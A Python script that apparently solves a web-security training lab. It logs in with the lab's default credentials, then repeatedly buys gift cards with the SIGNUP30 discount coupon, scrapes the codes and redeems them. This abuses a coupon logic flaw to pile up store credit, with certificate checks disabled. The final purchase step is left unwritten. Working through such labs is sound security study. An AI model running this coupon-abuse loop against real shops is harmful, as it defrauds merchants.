import sys
from warnings import resetwarnings
import urllib3
import requests
from bs4 import BeautifulSoup
from utils import get_csrf_token, login

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_gift_codes(html: str) -> list[str]:
    soup = BeautifulSoup(html, "html.parser")
    table = soup.find("table", class_="is-table-numbers")
    if not table:
        return []
    codes = []
    for td in table.find_all("td"):
        code = td.get_text(strip=True)
        if code:
            codes.append(code)
    return codes

def get_needed_amount(account_credit: float) ->int:
    needed = int(account_credit / 10)
    t = needed * 10
    expected_price = t - t * 0.3
    y = account_credit - expected_price
    z = int(y / 10)
    if z > 0:
        needed = needed + z
    return needed
    

def buy_item(session: requests.Session, url: str):
    # 1) Login
    print("(+) Trying to login...")
    login(session, f"{url}/login", username="wiener", password="peter")
    print("(+) Logged-in successfully.")

    # 2) Add gift card item and coupon SIGNUP30
    account_credit = 100
    x = get_needed_amount(account_credit)
    for i in range(444):
        response = session.post(f"{url}/cart", data={
            "productId": "2",
            "redir": "PRODUCT",
            "quantity": x
        },verify=False)
        response.raise_for_status()
        total = 10 * x
        
        # Applay the coupon -30%
        response = session.post(f"{url}/cart/coupon", data={
            "csrf": get_csrf_token(session, f"{url}/cart"),
            "coupon": "SIGNUP30"
        }, verify=False)
        response.raise_for_status()
        account_credit =  account_credit - total + (total * 0.3)
        
        # Checkout
        response = session.post(f"{url}/cart/checkout", data={
            "csrf": get_csrf_token(session, f"{url}/cart")
        }, verify=False)
        response.raise_for_status()

        # Extcract codes
        gift_codes = extract_gift_codes(response.text) ## needs test on demo using session cookie
        for code in gift_codes:
            response = session.post(f"{url}/gift-card", data={
                "csrf": get_csrf_token(session, f"{url}/my-account"),
                "gift-card": code
            }, verify=False)
            response.raise_for_status()
            account_credit = account_credit + 10
        x = get_needed_amount(account_credit)

    # Add "Lightweight l33t leather jacket"







def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    buy_item(session, sys.argv[1].rstrip("/"))


main()
